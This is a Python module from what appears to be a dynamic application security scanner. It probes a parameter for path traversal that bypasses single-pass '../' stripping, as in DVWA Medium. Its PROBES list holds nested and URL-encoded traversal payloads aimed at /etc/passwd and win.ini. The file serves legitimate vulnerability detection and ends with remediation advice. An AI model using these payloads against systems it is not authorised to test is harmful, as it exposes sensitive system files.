"""Medium Level File Inclusion Scenario: Nested Filter Bypass.

Audits for single-pass string replacement flaws (e.g. str_replace('../', '', $file)).
Simulates DVWA Medium security where naive pattern matching only cycles once,
allowing nested payloads like '..././' or '....//' to reconstruct traversal vectors.
"""

from __future__ import annotations

from typing import Any

from dast.detectors.injection.file_inclusion.scenarios.base import BaseFileInclusionScenario
from dast.http_client import HTTPClient
from dast.models import Confidence, Endpoint, EvidenceType, Finding, Severity


class MediumNestedScenario(BaseFileInclusionScenario):
    """Nested and URL-encoded traversal probes bypassing single-pass stripping."""

    name = "medium_nested"
    level = "Medium Level"
    technique = "Nested / Single-Pass Filter Bypass"

    PROBES = [
        # Nested sequences: when '../' is removed once, the remaining chars collapse back into '../'
        ("..././..././..././..././..././..././etc/passwd", "Nested dot-slash sequence (..././)"),
        ("....//....//....//....//....//....//etc/passwd", "Double-slash nested sequence (....//)"),
        ("...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini", "Windows nested backslash sequence (...\\.\\)"),
        ("....\\\\....\\\\....\\\\....\\\\....\\\\windows\\win.ini", "Windows double backslash sequence (....\\\\)"),
        # Single and double URL encoding bypasses
        ("..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd", "URL-encoded slash traversal (%2f)"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Double URL-encoded traversal (%2e%2e%2f)"),
    ]

    def evaluate(
        self,
        endpoint: Endpoint,
        param_name: str,
        client: HTTPClient,
        detector: Any,
    ) -> Finding | None:
        """Probe parameter using nested and encoded traversal bypasses."""
        for probe, probe_desc in self.PROBES:
            resp, req_meta, res_meta = self.send_probe(endpoint, client, param_name, probe)
            if not resp or not resp.text:
                continue

            for pattern, sig_desc in self.TARGET_SIGNATURES:
                if pattern.search(resp.text):
                    evidence = (
                        f"HTTP Traffic Evidence (Medium Level):\n"
                        f"Bypass Technique: {probe_desc}\n"
                        f"Injected Payload: {probe}\n"
                        f"Matched Sensitive Indicator: {sig_desc}\n"
                        f"Parameter: {param_name}"
                    )

                    return detector.create_finding(
                        title=f"Path Traversal (Medium Level - Filter Bypass) in Parameter '{param_name}'",
                        severity=Severity.HIGH,
                        confidence=Confidence.CERTAIN,
                        url=endpoint.url,
                        method=endpoint.method.value,
                        parameter=param_name,
                        evidence=evidence,
                        evidence_type=EvidenceType.HTTP_TRAFFIC,
                        description=(
                            f"Parameter '{param_name}' employs single-pass pattern stripping (such as str_replace('../', '', ...)) "
                            f"which was successfully bypassed using nested traversal '{probe}'. When the filter removes "
                            "matched substrings once, the surrounding tokens recombine into an active path traversal payload."
                        ),
                        remediation=(
                            "Never rely on recursive string replacement (blacklisting) to prevent path traversal. "
                            "Instead, enforce a strict allowlist of permissible file keys or resolve canonical file "
                            "paths against an authorized root directory with realpath verification."
                        ),
                        request_metadata=req_meta,
                        response_metadata=res_meta,
                    )

        return None

